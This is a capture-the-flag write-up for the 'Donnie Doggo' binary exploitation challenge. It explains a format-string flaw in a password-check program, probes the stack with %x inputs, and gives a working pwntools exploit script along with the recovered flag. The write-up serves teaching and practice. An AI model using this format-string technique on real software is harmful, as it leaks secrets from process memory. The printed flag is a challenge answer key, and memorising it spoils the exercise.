# Trellix Donnie Doggo Write Up

## Details:

Jeopardy style CTF

Category: Binary Exploitation

Comments:

```
Catmen has successfully burgled one of the K9's warehouses, carrying away a safe containing one of the pieces of Anubis! Unfortunately, the safe is secured with a digital lock that requires a password to open. Our intel suggests that the safe was in the possession of a K9 operative going by the alias "Donnie Doggo." The dossier Catmen put together on Donnie mentions that he likes two things: Halloween movies and reusing passwords, and at least one of these may work to our benefit. Supposedly, Donnie has been bragging at the office about writing his own super secure login program, but we suspect he may have bitten off more than he can chew. If you can exploit the binary and extract Donnie's password, that Anubis piece is as good as ours.

You can access Donnie's login program at 0.cloud.chals.io:25449.
```

## Write up:

For this challenge we were given a binary so my first step was opening the program in a decompiler and looking at the main function:

```c
0000134a      void* const var_4 = __return_addr
00001351      int32_t* var_10 = &argc
0000136f      setvbuf(fp: *stdout, buf: nullptr, mode: 2, size: 0)
00001381      char* flag = getenv(name: "FLAG")
00001399      printf(format: "Reading password from address: %…", flag)
000013ab      puts(str: "Welcome, Donnie.")
000013bd      printf(format: "Please enter your password: ")
000013e1      char* user_input
000013e1      int32_t eax_4
000013e1      if (fgets(buf: &user_input, n: 0x40, fp: *stdin) == 0)
000013f7          fwrite(buf: "ERR: failed to read password.\n", size: 1, count: 0x1e, fp: *stderr)
000013ff          eax_4 = 1
0000141c      else
0000141c          *(&user_input + strcspn(&user_input, "\n")) = 0
00001429          if (user_input.b != 0)
00001458              dummy(&user_input, flag)
00001460              eax_4 = 0
0000143f          else
0000143f              fwrite(buf: "ERR: password cannot be empty.\n", size: 1, count: 0x1f, fp: *stderr)
00001447              eax_4 = 2
0000146e      return eax_4
```

In the main function we get the flag which is an environment variable, storing it in a char pointer and then printing out the memory address of that value. The function then reads in some user input which has a max length of 64 characters. If the user_input was not empty then we pass both the user_input and the flag to the dummy function so that is where I moved to:

```c
000012cd  int32_t dummy(char* user_input, char* flag)
000012ed      char* printed_var
000012ed      sprintf(s: &printed_var, format: user_input)
00001309      int32_t eax_1
00001309      if (strcmp(&printed_var, flag) != 0)
00001331          eax_1 = printf(format: "ACCESS DENIED - "%s" does not ma…", &printed_var)
00001319      else
00001319          eax_1 = printf(format: "ACCESS GRANTED - "%s" is a match…", &printed_var)
0000133e      return eax_1
```

In this function we take our input and we send it to the printed_var using sprintf. After that, we compare the printed_var to our flag and print out either access granted or access denied as well as our printed_var string. 

Since the function prints out user input after passing it through sprintf, while letting us control the format, we can use this to print out the real flag. Our approach to solving this problem is to read in the memory address of the flag, then pass that to %s as it will print out our string. In order to do that we will also need to know where on the stack our user input is. So lets get started!

Now that we know what we need to do, it time to get the exploit working on our local version. The code will not work at this current state since we do not have the flag environmental variable set but lets run the code just to see what happens:

```
Reading password from address: (nil)
Welcome, Donnie.
Please enter your password: aa
Segmentation fault (core dumped)
```

As you can see, the address is nil and when we try to compare we get a segfault, so lets go ahead and set the value. To do this we can use export:

```
export FLAG="flag{test}"
```

And we can test that we set the correct flag by echoing the variable:

```
echo $FLAG
flag{test}
```

Now lets run the binary once more, this time with the correct flag just to make sure we understand how it works:

```
Reading password from address: 0xffda8d0b
Welcome, Donnie.
Please enter your password: flag{test}
ACCESS GRANTED - "flag{test}" is a match!
```
```
Reading password from address: 0xfff48d0b
Welcome, Donnie.
Please enter your password: flag
ACCESS DENIED - "flag" does not match your password.
```

This time, when the program is run we have an address printed and then it also prints our user input when run. So now its time to find out where on the stack our user input is when the sprintf is run. To do this we are going to put some characters (4 A's) followed by several %x's and .'s. This will give us a marker that we can see followed by period delimited pops from the stack:

```
Reading password from address: 0xff8e6d0b
Welcome, Donnie.
Please enter your password: AAAA.%x.%x.%x.%x.%x.%x.%x
ACCESS DENIED - "AAAA.f7e3bb7d.565572dd.41414141.6537662e.37626233.36352e64.32373535" does not match your password.
```

As you can see above, the third value on the stack is 0x41414141 which is the 4 A's that we started our user input with. Now that we have all of the pieces of information we need we can start crafting our solve script. 

The first line of the output from the binary includes the address so we need to read in the string, split out the address, and then convert it into a packed byte representation of the integer that we can send in our payload:

```py
addy = p32(int(s.recvline().split(b': 0x')[1][:-1], 16))
```

After that we are going to craft our actual payload, the payload will start with the address of the flag in memory, followed by the %s format tag with the modifier set to 3 to tell us to read the thrid value on the stack:

```py
payload = addy + b'%3$s'
```

Finally we end up with the following script:

```py
# import pwntools
from pwn import *

# get the process or remote nc
s = process('./DD_Login')
#s = remote('0.cloud.chals.io', 25449)

# get the address
addy = p32(int(s.recvline().split(b': 0x')[1][:-1], 16))

# craft the payload
payload = addy + b'%3$s'

# send the payload
s.sendline(payload)

# get the flag
print(s.recvline())
print(s.recvline())
```

When run locally we get:

```
[+] Starting local process './DD_Login': pid 2818
b'Welcome, Donnie.\n'
b'Please enter your password: ACCESS DENIED - "\x05\xdd\xf2\xfff7e11b7d5661c2ddflag{test}" does not match your password.\n'
[*] Process './DD_Login' stopped with exit code 0 (pid 2818)
```

And then when run while pointed at the remote address we get:

```
[+] Opening connection to 0.cloud.chals.io on port 25449: Done
b'Welcome, Donnie.\n'
b'Please enter your password: ACCESS DENIED - "\xad~\xd2\xff0565b72ddATR[Ce11arD00r]" does not match your password.\n'
[*] Closed connection to 0.cloud.chals.io port 25449
```

Where the flag is:

```
ATR[Ce11arD00r]
```